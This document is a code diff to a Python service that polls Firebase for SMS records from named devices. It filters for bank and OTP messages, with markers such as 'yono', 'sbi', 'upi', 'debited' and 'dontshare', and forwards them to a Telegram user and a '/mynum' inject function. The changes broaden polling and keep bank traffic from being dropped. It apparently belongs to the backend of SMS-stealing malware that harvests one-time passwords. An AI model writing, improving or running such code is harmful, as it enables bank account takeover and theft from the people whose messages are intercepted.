@@ -101,8 +101,8 @@ TIME_FIELDS = (
     "receivedDate",
     "createdDate",
 )
-RECENT_MESSAGES_LIMIT = 15
-MAX_OTP_DELIVER_PER_POLL = 10
+RECENT_MESSAGES_LIMIT = 25
+MAX_OTP_DELIVER_PER_POLL = 12
 _MESSAGES_DEVICE_PATH_RE = re.compile(r"^messages/[^/]+$")
 SEEN_META_KEY = "firebase_sms_seen"
 BASELINE_META_KEY = "firebase_sms_baseline"
@@ -223,11 +223,18 @@ def clear_sms_baseline(device: Device) -> None:
     _save_meta(device, meta)
 
 
-def _message_push_id(record: dict[str, Any]) -> int | None:
+def _message_leaf_key(record: dict[str, Any]) -> str | None:
     firebase_key = str(record.get("firebase_key") or "")
     if not firebase_key.startswith("messages/"):
         return None
     leaf = firebase_key.rsplit("/", 1)[-1]
+    return leaf or None
+
+
+def _message_push_id(record: dict[str, Any]) -> int | None:
+    leaf = _message_leaf_key(record)
+    if not leaf:
+        return None
     try:
         return int(leaf)
     except ValueError:
@@ -285,12 +292,40 @@ def _should_deliver_otp_record(
     record: dict[str, Any],
     device: Device,
 ) -> bool:
-    if _record_dedup_key(record) in get_seen_sms_keys(device):
+    dedup = _record_dedup_key(record)
+    if dedup in get_seen_sms_keys(device):
         return False
     push_id = _message_push_id(record)
-    if push_id is None:
-        return False
-    return push_id > _messages_high_water(device)
+    if push_id is not None:
+        return push_id > _messages_high_water(device)
+    # Firebase push ids like -NxYz — deliver once via seen set, no numeric high-water.
+    if _message_leaf_key(record):
+        return True
+    return False
+
+
+def _looks_like_incoming_sms(sender: str, body: str) -> bool:
+    """Never treat bank / YONO / OTP traffic as poll noise."""
+    sender_u = (sender or "").strip().upper()
+    body_l = (body or "").lower()
+    if sender_u and sender_u not in {"UNKNOWN", "__OUT__", "0", "1", "2"} and "-" in sender_u:
+        return True
+    if re.search(r"\b\d{4,8}\b", body or ""):
+        return True
+    markers = (
+        "otp",
+        "yono",
+        "sbi",
+        "upi",
+        "registration",
+        "debited",
+        "credited",
+        "txn",
+        "balance",
+        "account",
+        "dontshare",
+    )
+    return any(marker in body_l for marker in markers) or len((body or "").strip()) > 48
 
 
 def _parse_body_date(text: str) -> datetime | None:
@@ -1104,12 +1139,20 @@ async def _ensure_messages_high_water(
         if push_ids:
             high_water = max(push_ids)
 
+    try:
+        shallow = await _fetch_messages_shallow_keys(root, device_id, fetch_timeout)
+        if shallow:
+            mark_sms_keys_seen(device, shallow)
+    except Exception:
+        shallow = set()
+
     _set_baseline_high_water(device, high_water, profile.started_at)
     db.commit()
     logger.info(
-        "OTP high_water init device=%s high_water=%s (lock latest, no bulk)",
+        "OTP high_water init device=%s high_water=%s seen_keys=%s (lock tail, no bulk)",
         device_id,
         high_water,
+        len(shallow),
     )
     return high_water
 
@@ -1120,7 +1163,7 @@ async def _poll_messages_otp_only(
     firebase_url: str,
     db,
 ) -> int:
-    """Single-path OTP poll: messages/{device_id} tail only -> bot DM."""
+    """Poll messages + client webhook SMS paths; deliver all new OTPs."""
     from app.telegram_notify import send_otp_received_dm
 
     device_id = (device.name or "").strip()
@@ -1132,27 +1175,38 @@ async def _poll_messages_otp_only(
     high_water = _messages_high_water(device)
 
     root = firebase_root_url(firebase_url)
-    path = f"messages/{device_id}"
-    try:
-        fetch_timeout = _otp_poll_timeout()
-        records = await asyncio.wait_for(
-            _fetch_path_records(root, path, fetch_timeout),
-            timeout=fetch_timeout + 0.18,
-        )
-    except (asyncio.TimeoutError, httpx.HTTPError, Exception) as exc:
-        logger.warning("OTP poll failed device=%s: %s", device_id, exc)
-        return 0
+    fetch_timeout = _otp_poll_timeout()
+    records: list[dict[str, Any]] = []
+    for path in _build_hot_poll_paths(device):
+        try:
+            chunk = await asyncio.wait_for(
+                _fetch_path_records(root, path, fetch_timeout),
+                timeout=fetch_timeout + 0.35,
+            )
+            if chunk:
+                records.extend(chunk)
+        except (asyncio.TimeoutError, httpx.HTTPError, Exception) as exc:
+            logger.debug("OTP poll path miss %s device=%s: %s", path, device_id, exc)
+    records = _dedupe_records(records)
+    if not records:
+        logger.warning("OTP poll empty device=%s (network or wrong path)", device_id)
 
     candidates: list[dict[str, Any]] = []
     for record in records:
-        push_id = _message_push_id(record)
-        if push_id is None or not _should_deliver_otp_record(record, device):
+        if not _should_deliver_otp_record(record, device):
             continue
         sender = str(record.get("sender") or "Unknown")
         body = str(record.get("message") or "")
-        if _is_poll_noise_record(sender, body) or _is_outgoing_firebase_log(sender, body):
-            _bump_messages_high_water(device, push_id)
-            mark_sms_keys_seen(device, {_record_dedup_key(record)})
+        if (
+            not _looks_like_incoming_sms(sender, body)
+            and (
+                _is_poll_noise_record(sender, body)
+                or _is_outgoing_firebase_log(sender, body)
+            )
+        ):
+            push_id = _message_push_id(record)
+            if push_id is not None:
+                _bump_messages_high_water(device, push_id)
             continue
         candidates.append(record)
 
@@ -1176,17 +1230,14 @@ async def _poll_messages_otp_only(
 
     for record in to_deliver:
         push_id = _message_push_id(record)
-        if push_id is None:
-            continue
         sender = str(record.get("sender") or "Unknown")
         body = str(record.get("message") or "")
 
-        inject_task = asyncio.create_task(
-            forward_incoming_to_mynum(db, profile, device, sender, body)
-        )
-        dm_task = asyncio.create_task(send_otp_received_dm(profile.telegram_user_id, sender, body))
+        inject_ok = False
+        dm_ok = False
         try:
-            await inject_task
+            await forward_incoming_to_mynum(db, profile, device, sender, body)
+            inject_ok = True
         except Exception as exc:
             logger.warning(
                 "OTP inject to /mynum failed device=%s sender=%s: %s",
@@ -1195,15 +1246,17 @@ async def _poll_messages_otp_only(
                 exc,
             )
 
-        ok = await dm_task
-        if not ok:
+        dm_ok = await send_otp_received_dm(profile.telegram_user_id, sender, body)
+        if not dm_ok:
             logger.error(
-                "OTP bot DM failed user=%s sender=%s id=%s",
+                "OTP bot DM failed user=%s sender=%s id=%s (inject_ok=%s)",
                 profile.telegram_user_id,
                 sender,
                 push_id,
+                inject_ok,
             )
-            continue
+            if not inject_ok:
+                continue
 
         save_sms(
             db,
@@ -1213,7 +1266,8 @@ async def _poll_messages_otp_only(
             received_at=record.get("received_at"),
         )
         mark_sms_keys_seen(device, {_record_dedup_key(record)})
-        max_push_id = max(max_push_id, int(push_id))
+        if push_id is not None:
+            max_push_id = max(max_push_id, int(push_id))
         delivered += 1
         logger.info(
             "OTP delivered user=%s sender=%s push_id=%s",
@@ -1223,7 +1277,10 @@ async def _poll_messages_otp_only(
         )
 
     if delivered:
-        _bump_messages_high_water(device, max_push_id)
+        if max_push_id > _messages_high_water(device):
+            _bump_messages_high_water(device, max_push_id)
+        db.commit()
+    elif candidates:
         db.commit()
     return delivered
 
